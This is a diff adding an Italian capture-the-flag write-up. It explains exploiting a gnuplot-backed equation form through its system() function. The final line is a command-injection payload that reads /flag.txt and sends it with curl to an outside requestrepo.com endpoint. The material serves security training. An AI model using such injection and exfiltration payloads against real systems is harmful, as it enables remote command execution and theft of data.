@@ -1,0 +1,20 @@
+# Scenario da Black Box: non sappiamo come sia fatto il sito ne tanto meno che cosa utilizza.
+# Sappiamo solo che possiamo inserire delle equazione che verranno valutate e disegnate a schermo.
+# Si può notare, dopo aver inserito un'equazione a caso ma valida, tra gli header della risposta,
+# che il backend utilizza 'gnuplot' per poter creare i grafici.
+
+# Spulciano nella documentazione per capire come funziona e cosa è possibile inserire come equazioni
+# si possono trovare tutte le possibili funzioni utilizzabili dall'utente
+https://gnuplot.sourceforge.net/docs_4.2/node53.html
+
+# Per fare una prova che questo funzioni è possibile provare a inserire una funzione matematica e notare
+# come questa viene correttamente processata e plottata.
+# Tra le funzioni possibili ci sono anche quelle relative alla manipolazione delle stringhe, in particolare
+# la funzione 'system' che permette di eseguire comandi di shell e ottenere il risultato sullo stream di out.
+# Per provare che funzioni e non ci siano possibili filtri è possibile inserire nel form "system('sleep 2')"
+# (Spoiler: funziona :D)
+
+# Siccome non possiamo ottenere a schermo la flag, possiamo usare un server controllato da noi per ricevere
+# le richieste, che invieremo tramite form, tramite cURL (verrà utilizzato https://requestrepo.com/).
+# NOTA: <sessionURL> è la URL di sessione nella pagina dal sito
+system('sleep 2; curl -X POST --data $(cat /flag.txt) http://<sessionURL>.requestrepo.com')
